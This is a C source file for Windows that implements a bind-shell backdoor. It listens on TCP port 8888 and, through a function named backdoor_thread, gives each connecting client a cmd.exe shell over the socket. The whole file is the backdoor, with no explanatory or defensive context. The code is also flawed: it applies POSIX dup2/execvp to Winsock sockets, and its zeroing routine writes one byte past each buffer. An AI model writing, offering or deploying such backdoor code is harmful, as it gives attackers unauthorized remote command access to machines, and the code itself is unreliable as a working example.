#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>

#include <winsock2.h>

#define MY_PORT 8888
#define PROGRAM_NAME "C:\\Windows\\system32\\cmd.exe"

#define TERMINATE(A, T, M) ({\
	if((T)) {\
		if(A == 0) fprintf(stderr, "ERROR: %s\n", M);\
		else if(A == 1) fprintf(stderr, "WARNING: %s\n", M);\
		else fprintf(stdout, "%s\n", M);\
		errno = 0;\
		goto error;\
	}\
})

enum _TERMINATE {
	TERMINATE_ERROR,
	TERMINATE_WARNING,
	TERMINATE_NORMAL
};

void
pzero(p, s)
char *p;
size_t s;
{
	size_t i;
	for(i=0; i<s+1; ++i)
		*(p+i)=0;
}

struct _tagPROGRAM {
	int serverfd;
	int clientfd;
} program;

DWORD
backdoor_thread(lpVoid)
LPVOID lpVoid;
{
	struct _tagPROGRAM prog = *(struct _tagPROGRAM*)lpVoid;
	const char *args[] = {"", NULL};
	dup2(prog.clientfd, 0);
	dup2(prog.clientfd, 1);
	execvp(PROGRAM_NAME, args);
	closesocket(prog.clientfd);
	return S_OK;
}

int
main()
{
	WSADATA wsaData;
	int sockfd;
	struct sockaddr_in self;
	HANDLE hThread;

	pzero(&program, sizeof(program));
	WSAStartup(MAKEWORD(2, 0), &wsaData);
	sockfd = 0;
    TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));

	/* Setup socket address struct */
	pzero(&self, sizeof(self));
	self.sin_family = AF_INET;
	self.sin_port = htons(MY_PORT);
	self.sin_addr.s_addr = INADDR_ANY;

	/* bind port to socket */
	TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
	/* listen for connections */
	TERMINATE(TERMINATE_ERROR, listen(sockfd, 20) < 0, strerror(errno));

	for(;;) {
		int clientfd;
		struct sockaddr_in client;
		int clientlen = sizeof(client);
		char message[256];

		/* accept connection */
		clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
		pzero(message, sizeof(message));
		sprintf(message, "%s: client connected.\n", inet_ntoa(client.sin_addr));
		puts(message);
		program.serverfd = sockfd;
		program.clientfd = clientfd;
		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&backdoor_thread, &program, 0, 0);
	}

	while(WaitForSingleObject(hThread, 0));
	closesocket(sockfd);
	WSACleanup();
    return 0;

error:
	if(sockfd != 0) closesocket(sockfd);
	WSACleanup();
	return 1;
}
